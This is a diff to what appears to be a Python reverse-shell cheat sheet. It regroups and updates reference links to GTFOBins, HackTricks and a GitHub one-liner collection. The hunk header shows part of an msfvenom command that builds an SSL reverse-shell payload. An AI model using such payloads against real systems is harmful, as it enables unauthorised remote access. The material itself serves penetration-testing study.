@@ -39,8 +39,14 @@ $ msfvenom -p cmd/unix/reverse_python_ssl handlersslcert=[/path/to/file.pem] ssl
 ---
 ## References
 
-- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)
-
-- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+### Github
 
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+### GTFOBins
+
+- [GTFOBins: Python](https://gtfobins.github.io/gtfobins/python/)
+
+### Hacktricks
+
+- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
